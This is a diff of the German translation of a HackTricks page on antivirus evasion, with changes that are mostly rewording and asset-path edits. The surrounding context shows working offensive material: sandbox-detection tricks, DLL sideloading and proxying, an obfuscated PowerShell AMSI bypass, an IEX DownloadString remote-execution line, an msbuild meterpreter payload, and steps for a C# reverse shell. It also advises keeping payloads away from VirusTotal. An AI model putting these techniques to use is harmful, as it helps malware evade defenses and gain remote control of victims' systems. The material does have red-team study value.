@@ -1,8 +1,8 @@
 # Antivirus (AV) Bypass
 
 {% hint style="success" %}
-Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -15,7 +15,7 @@ Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 </details>
 {% endhint %}
 
-<figure><img src="/.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Wenn du an einer **Hacking-Karriere** interessiert bist und das Unhackbare hacken möchtest - **wir stellen ein!** (_fließend Polnisch in Wort und Schrift erforderlich_).
 
@@ -53,11 +53,11 @@ Ich empfehle dir dringend, diese [YouTube-Playlist](https://www.youtube.com/play
 
 Die dynamische Analyse erfolgt, wenn das AV deine Binärdatei in einer Sandbox ausführt und nach bösartiger Aktivität Ausschau hält (z. B. versuchen, die Passwörter deines Browsers zu entschlüsseln und zu lesen, einen Minidump von LSASS durchzuführen usw.). Dieser Teil kann etwas kniffliger sein, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.
 
-* **Schlaf vor der Ausführung** Abhängig davon, wie es implementiert ist, kann es eine großartige Möglichkeit sein, die dynamische Analyse von AV zu umgehen. AVs haben sehr wenig Zeit, um Dateien zu scannen, um den Arbeitsablauf des Benutzers nicht zu unterbrechen, daher können lange Schlafzeiten die Analyse von Binärdateien stören. Das Problem ist, dass viele AV-Sandboxes den Schlaf je nach Implementierung einfach überspringen können.
-* **Überprüfung der Ressourcen des Systems** Normalerweise haben Sandboxes sehr wenig Ressourcen zur Verfügung (z. B. < 2 GB RAM), andernfalls könnten sie die Maschine des Benutzers verlangsamen. Du kannst hier auch sehr kreativ werden, zum Beispiel indem du die CPU-Temperatur oder sogar die Lüftergeschwindigkeiten überprüfst, nicht alles wird in der Sandbox implementiert sein.
-* **Maschinenspezifische Überprüfungen** Wenn du einen Benutzer ansprechen möchtest, dessen Arbeitsstation mit der Domäne "contoso.local" verbunden ist, kannst du eine Überprüfung der Domäne des Computers durchführen, um zu sehen, ob sie mit der von dir angegebenen übereinstimmt. Wenn nicht, kannst du dein Programm beenden.
+* **Schlafen vor der Ausführung** Abhängig davon, wie es implementiert ist, kann es eine großartige Möglichkeit sein, die dynamische Analyse von AVs zu umgehen. AVs haben sehr wenig Zeit, um Dateien zu scannen, um den Arbeitsablauf des Benutzers nicht zu unterbrechen, daher können lange Schlafzeiten die Analyse von Binärdateien stören. Das Problem ist, dass viele AV-Sandboxes den Schlaf je nach Implementierung einfach überspringen können.
+* **Überprüfen der Ressourcen des Computers** Normalerweise haben Sandboxes sehr wenig Ressourcen zur Verfügung (z. B. < 2 GB RAM), andernfalls könnten sie den Computer des Benutzers verlangsamen. Du kannst hier auch sehr kreativ werden, zum Beispiel indem du die Temperatur der CPU oder sogar die Lüftergeschwindigkeiten überprüfst, nicht alles wird in der Sandbox implementiert.
+* **Maschinenspezifische Überprüfungen** Wenn du einen Benutzer anvisieren möchtest, dessen Arbeitsstation mit der Domäne "contoso.local" verbunden ist, kannst du eine Überprüfung der Domäne des Computers durchführen, um zu sehen, ob sie mit der von dir angegebenen übereinstimmt. Wenn nicht, kannst du dein Programm beenden.
 
-Es stellt sich heraus, dass der Sandbox-Computername von Microsoft Defender HAL9TH ist, also kannst du den Computernamen in deiner Malware vor der Detonation überprüfen. Wenn der Name mit HAL9TH übereinstimmt, bedeutet das, dass du dich in der Sandbox von Defender befindest, also kannst du dein Programm beenden.
+Es stellt sich heraus, dass der Computername der Sandbox von Microsoft Defender HAL9TH ist, also kannst du den Computernamen in deiner Malware vor der Detonation überprüfen. Wenn der Name mit HAL9TH übereinstimmt, bedeutet das, dass du dich in der Sandbox von Defender befindest, also kannst du dein Programm beenden.
 
 <figure><img src="../.gitbook/assets/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
@@ -72,7 +72,7 @@ Wenn du zum Beispiel LSASS dumpen möchtest, **musst du wirklich mimikatz verwen
 Die richtige Antwort ist wahrscheinlich Letzteres. Wenn man mimikatz als Beispiel nimmt, ist es wahrscheinlich eines der, wenn nicht das am häufigsten markierte Stück Malware von AVs und EDRs. Während das Projekt selbst super cool ist, ist es auch ein Albtraum, damit zu arbeiten, um an AVs vorbeizukommen, also suche einfach nach Alternativen für das, was du erreichen möchtest.
 
 {% hint style="info" %}
-Wenn du deine Payloads zur Umgehung modifizierst, stelle sicher, dass du **die automatische Probenübermittlung** in Defender deaktivierst, und bitte, ernsthaft, **LADEN SIE NICHT AUF VIRUSTOTAL HOCH**, wenn dein Ziel darin besteht, langfristig eine Umgehung zu erreichen. Wenn du überprüfen möchtest, ob deine Payload von einem bestimmten AV erkannt wird, installiere es auf einer VM, versuche, die automatische Probenübermittlung zu deaktivieren, und teste es dort, bis du mit dem Ergebnis zufrieden bist.
+Wenn du deine Payloads zur Umgehung modifizierst, stelle sicher, dass du **die automatische Probenübermittlung** in Defender **deaktivierst**, und bitte, ernsthaft, **LADEN SIE NICHT AUF VIRUSTOTAL HOCH**, wenn dein Ziel darin besteht, langfristig eine Umgehung zu erreichen. Wenn du überprüfen möchtest, ob deine Payload von einem bestimmten AV erkannt wird, installiere es auf einer VM, versuche, die automatische Probenübermittlung zu deaktivieren, und teste es dort, bis du mit dem Ergebnis zufrieden bist.
 {% endhint %}
 
 ## EXEs vs DLLs
@@ -87,7 +87,7 @@ Jetzt zeigen wir einige Tricks, die du mit DLL-Dateien verwenden kannst, um viel
 
 ## DLL Sideloading & Proxying
 
-**DLL Sideloading** nutzt die DLL-Suchreihenfolge aus, die vom Loader verwendet wird, indem sowohl die Zielanwendung als auch die bösartigen Payload(s) nebeneinander positioniert werden.
+**DLL Sideloading** nutzt die von dem Loader verwendete DLL-Suchreihenfolge aus, indem sowohl die Opferanwendung als auch die bösartigen Payload(s) nebeneinander positioniert werden.
 
 Du kannst nach Programmen suchen, die anfällig für DLL Sideloading sind, indem du [Siofra](https://github.com/Cybereason/siofra) und das folgende PowerShell-Skript verwendest:
 
@@ -102,7 +102,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 
 Dieser Befehl gibt die Liste der Programme aus, die anfällig für DLL-Hijacking in "C:\Program Files\\" sind, sowie die DLL-Dateien, die sie zu laden versuchen.
 
-Ich empfehle dringend, dass Sie **DLL-hijackbare/sideloadbare Programme selbst erkunden**. Diese Technik ist ziemlich stealthy, wenn sie richtig durchgeführt wird, aber wenn Sie öffentlich bekannte DLL-sideloadbare Programme verwenden, könnten Sie leicht erwischt werden.
+Ich empfehle Ihnen dringend, **DLL-hijackbare/sideloadbare Programme selbst zu erkunden**. Diese Technik ist ziemlich heimlich, wenn sie richtig durchgeführt wird, aber wenn Sie öffentlich bekannte DLL-sideloadbare Programme verwenden, könnten Sie leicht erwischt werden.
 
 Allein durch das Platzieren einer bösartigen DLL mit dem Namen, den ein Programm erwartet zu laden, wird Ihr Payload nicht geladen, da das Programm einige spezifische Funktionen innerhalb dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine andere Technik namens **DLL-Proxying/Forwarding**.
 
@@ -121,7 +121,7 @@ Dies sind die Schritte, die ich befolgt habe:
 ```
 {% endcode %}
 
-Der letzte Befehl gibt uns 2 Dateien: eine DLL-Quellcodevorlage und die original umbenannte DLL.
+Der letzte Befehl wird uns 2 Dateien geben: eine DLL-Quellcodevorlage und die original umbenannte DLL.
 
 <figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
 
@@ -140,7 +140,7 @@ Sowohl unser Shellcode (kodiert mit [SGN](https://github.com/EgeBalci/sgn)) als 
 <figure><img src="../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-Ich **empfehle dringend**, dass Sie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading ansehen und auch [ippsec's Video](https://www.youtube.com/watch?v=3eROsG_WNpE), um mehr über das, was wir ausführlicher besprochen haben, zu erfahren.
+Ich **empfehle dringend**, dass Sie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading ansehen und auch [ippsec's Video](https://www.youtube.com/watch?v=3eROsG\_WNpE), um mehr über das, was wir ausführlicher besprochen haben, zu erfahren.
 {% endhint %}
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
@@ -162,7 +162,7 @@ Evasion ist nur ein Katz-und-Maus-Spiel, was heute funktioniert, könnte morgen 
 
 ## AMSI (Anti-Malware Scan Interface)
 
-AMSI wurde geschaffen, um "[fileless malware](https://en.wikipedia.org/wiki/Fileless\_malware)" zu verhindern. Zunächst waren AVs nur in der Lage, **Dateien auf der Festplatte** zu scannen, also wenn du es irgendwie schaffen konntest, Payloads **direkt im Speicher** auszuführen, konnte der AV nichts tun, um dies zu verhindern, da er nicht genügend Sichtbarkeit hatte.
+AMSI wurde geschaffen, um "[fileless malware](https://en.wikipedia.org/wiki/Fileless\_malware)" zu verhindern. Zunächst waren AVs nur in der Lage, **Dateien auf der Festplatte** zu scannen, also wenn du es irgendwie schaffen konntest, Payloads **direkt im Speicher** auszuführen, konnte das AV nichts tun, um es zu verhindern, da es nicht genügend Sichtbarkeit hatte.
 
 Die AMSI-Funktion ist in diese Komponenten von Windows integriert.
 
@@ -174,11 +174,11 @@ Die AMSI-Funktion ist in diese Komponenten von Windows integriert.
 
 Es ermöglicht Antivirenlösungen, das Verhalten von Skripten zu inspizieren, indem der Skriptinhalt in einer Form offengelegt wird, die sowohl unverschlüsselt als auch nicht obfuskiert ist.
 
-Die Ausführung von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` wird den folgenden Alarm auf Windows Defender erzeugen.
+Die Ausführung von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` wird den folgenden Alarm bei Windows Defender erzeugen.
 
 <figure><img src="../.gitbook/assets/image (1135).png" alt=""><figcaption></figcaption></figure>
 
-Beachte, wie es `amsi:` voranstellt und dann den Pfad zur ausführbaren Datei, von der das Skript ausgeführt wurde, in diesem Fall powershell.exe.
+Beachte, wie es `amsi:` voranstellt und dann den Pfad zur ausführbaren Datei angibt, von der das Skript ausgeführt wurde, in diesem Fall powershell.exe.
 
 Wir haben keine Datei auf die Festplatte geschrieben, wurden aber trotzdem im Speicher aufgrund von AMSI erwischt.
 
@@ -188,15 +188,15 @@ Es gibt ein paar Möglichkeiten, um AMSI zu umgehen:
 
 Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der Skripte, die du zu laden versuchst, eine gute Möglichkeit sein, um Erkennung zu umgehen.
 
-Allerdings hat AMSI die Fähigkeit, Skripte zu deobfuskieren, selbst wenn sie mehrere Schichten haben, sodass Obfuskation je nach Ausführung eine schlechte Option sein könnte. Das macht es nicht so einfach, zu entkommen. Obwohl manchmal alles, was du tun musst, darin besteht, ein paar Variablennamen zu ändern, und du bist auf der sicheren Seite, also hängt es davon ab, wie stark etwas markiert wurde.
+Allerdings hat AMSI die Fähigkeit, Skripte zu deobfuskieren, selbst wenn sie mehrere Schichten haben, sodass Obfuskation je nach Ausführung eine schlechte Option sein könnte. Das macht es nicht so einfach, zu entkommen. Manchmal musst du jedoch nur ein paar Variablennamen ändern, und du bist auf der sicheren Seite, also hängt es davon ab, wie stark etwas markiert wurde.
 
 * **AMSI Bypass**
 
-Da AMSI implementiert ist, indem eine DLL in den PowerShell (auch cscript.exe, wscript.exe usw.) Prozess geladen wird, ist es möglich, damit einfach zu manipulieren, selbst wenn man als unprivilegierter Benutzer läuft. Aufgrund dieses Fehlers in der Implementierung von AMSI haben Forscher mehrere Möglichkeiten gefunden, um AMSI-Scans zu umgehen.
+Da AMSI implementiert ist, indem eine DLL in den PowerShell (auch cscript.exe, wscript.exe usw.) Prozess geladen wird, ist es möglich, damit leicht zu manipulieren, selbst wenn man als unprivilegierter Benutzer läuft. Aufgrund dieses Fehlers in der Implementierung von AMSI haben Forscher mehrere Möglichkeiten gefunden, um AMSI-Scans zu umgehen.
 
 **Einen Fehler erzwingen**
 
-Das Erzwingen des Fehlers bei der AMSI-Initialisierung (amsiInitFailed) führt dazu, dass kein Scan für den aktuellen Prozess initiiert wird. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) offengelegt und Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.
+Das Erzwingen des Fehlers bei der AMSI-Initialisierung (amsiInitFailed) führt dazu, dass kein Scan für den aktuellen Prozess initiiert wird. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) offengelegt, und Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.
 
 {% code overflow="wrap" %}
 ```powershell
@@ -220,7 +220,7 @@ $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
 $Spotfix.SetValue($null,$true)
 }Catch{Throw $_}
 ```
-Keep in mind, dass dies wahrscheinlich markiert wird, sobald dieser Beitrag veröffentlicht wird, also solltest du keinen Code veröffentlichen, wenn dein Plan ist, unentdeckt zu bleiben.
+Keep in mind, dass dies wahrscheinlich markiert wird, sobald dieser Beitrag veröffentlicht wird, also solltest du keinen Code veröffentlichen, wenn dein Plan darin besteht, unentdeckt zu bleiben.
 
 **Memory Patching**
 
@@ -250,15 +250,15 @@ Es gibt mehrere Tools, die verwendet werden können, um **C# Klartextcode zu obf
 
 ## SmartScreen & MoTW
 
-Du hast diesen Bildschirm vielleicht gesehen, als du einige ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt hast.
+Du hast vielleicht diesen Bildschirm gesehen, als du einige ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt hast.
 
 Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der dazu dient, den Endbenutzer vor dem Ausführen potenziell schädlicher Anwendungen zu schützen.
 
 <figure><img src="../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>
 
-SmartScreen funktioniert hauptsächlich mit einem reputationsbasierten Ansatz, was bedeutet, dass ungewöhnlich heruntergeladene Anwendungen SmartScreen auslösen und somit den Endbenutzer daran hindern, die Datei auszuführen (obwohl die Datei weiterhin ausgeführt werden kann, indem man auf Mehr Informationen -> Trotzdem ausführen klickt).
+SmartScreen funktioniert hauptsächlich mit einem rufbasierten Ansatz, was bedeutet, dass unüblich heruntergeladene Anwendungen SmartScreen auslösen und somit den Endbenutzer daran hindern, die Datei auszuführen (obwohl die Datei weiterhin ausgeführt werden kann, indem man auf Weitere Informationen -> Trotzdem ausführen klickt).
 
-**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) mit dem Namen Zone.Identifier, der automatisch beim Herunterladen von Dateien aus dem Internet erstellt wird, zusammen mit der URL, von der sie heruntergeladen wurden.
+**MoTW** (Mark of The Web) ist ein [NTFS Alternativer Datenstrom](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) mit dem Namen Zone.Identifier, der automatisch beim Herunterladen von Dateien aus dem Internet erstellt wird, zusammen mit der URL, von der sie heruntergeladen wurden.
 
 <figure><img src="../.gitbook/assets/image (237).png" alt=""><figcaption><p>Überprüfung des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>
 
@@ -302,7 +302,7 @@ Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads in ISO-Dateien ve
 
 Das Laden von C#-Binaries im Speicher ist schon seit einiger Zeit bekannt und es ist immer noch eine sehr gute Möglichkeit, Ihre Post-Exploitation-Tools auszuführen, ohne von AV erwischt zu werden.
 
-Da das Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur um das Patchen von AMSI für den gesamten Prozess kümmern.
+Da die Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur um das Patchen von AMSI für den gesamten Prozess kümmern.
 
 Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc usw.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen, aber es gibt verschiedene Möglichkeiten, dies zu tun:
 
@@ -314,7 +314,7 @@ Es beinhaltet **das Erzeugen eines neuen opfernden Prozesses**, injizieren Sie I
 
 * **Inline**
 
-Es geht darum, den post-exploitation schädlichen Code **in seinen eigenen Prozess** zu injizieren. Auf diese Weise können Sie vermeiden, einen neuen Prozess zu erstellen und ihn von AV scannen zu lassen, aber der Nachteil ist, dass, wenn etwas mit der Ausführung Ihres Payloads schiefgeht, die **Wahrscheinlichkeit** viel größer ist, dass Sie **Ihr Beacon verlieren**, da es abstürzen könnte.
+Es geht darum, den post-exploitation schädlichen Code **in seinen eigenen Prozess** zu injizieren. Auf diese Weise können Sie vermeiden, einen neuen Prozess zu erstellen und ihn von AV scannen zu lassen, aber der Nachteil ist, dass, wenn etwas mit der Ausführung Ihrer Payload schiefgeht, die **Wahrscheinlichkeit** viel größer ist, dass Sie **Ihr Beacon verlieren**, da es abstürzen könnte.
 
 <figure><img src="../.gitbook/assets/image (1136).png" alt=""><figcaption></figcaption></figure>
 
@@ -334,7 +334,7 @@ Das Repo weist darauf hin: Defender scannt weiterhin die Skripte, aber durch die
 
 ## Fortgeschrittene Umgehung
 
-Umgehung ist ein sehr kompliziertes Thema, manchmal müssen Sie viele verschiedene Telemetriequellen in nur einem System berücksichtigen, sodass es ziemlich unmöglich ist, in reifen Umgebungen völlig unentdeckt zu bleiben.
+Umgehung ist ein sehr kompliziertes Thema, manchmal müssen Sie viele verschiedene Quellen von Telemetrie in nur einem System berücksichtigen, sodass es ziemlich unmöglich ist, in reifen Umgebungen völlig unentdeckt zu bleiben.
 
 Jede Umgebung, gegen die Sie vorgehen, hat ihre eigenen Stärken und Schwächen.
 
@@ -355,7 +355,7 @@ Ein weiteres Tool, das **dasselbe tut, ist** [**avred**](https://github.com/dobi
 
 ### **Telnet-Server**
 
-Bis Windows 10 kam jeder Windows mit einem **Telnet-Server**, den Sie (als Administrator) installieren konnten, indem Sie:
+Bis Windows 10 kam jede Windows-Version mit einem **Telnet-Server**, den Sie (als Administrator) installieren konnten, indem Sie:
 ```bash
 pkgmgr /iu:"TelnetServer" /quiet
 ```
@@ -410,7 +410,7 @@ sel lport 4444
 generate #payload is the default name
 #This will generate a meterpreter xml and a rcc file for msfconsole
 ```
-Jetzt **starten Sie den Lister** mit `msfconsole -r file.rc` und **führen Sie** die **xml payload** mit aus:
+Jetzt **starten Sie den Lister** mit `msfconsole -r file.rc` und **führen Sie** die **xml-Nutzlast** mit aus:
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
@@ -420,7 +420,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 
 https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
-#### Erste C# Revershell
+#### Erste C# Reverse Shell
 
 Kompilieren Sie es mit:
 ```
@@ -503,11 +503,11 @@ catch (Exception err) { }
 }
 }
 ```
-### C# unter Verwendung des Compilers
+### C# Compiler verwenden
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
-[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57b815abe21ef04857b066)
+[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)
 
 [REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)
 
@@ -569,19 +569,19 @@ https://github.com/praetorian-code/vulcan
 
 * [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)
 
-<figure><img src="/.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Wenn Sie an einer **Hacking-Karriere** interessiert sind und das Unhackbare hacken möchten - **wir stellen ein!** (_fließend Polnisch in Wort und Schrift erforderlich_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 {% hint style="success" %}
-Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>HackTricks unterstützen</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
 * Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
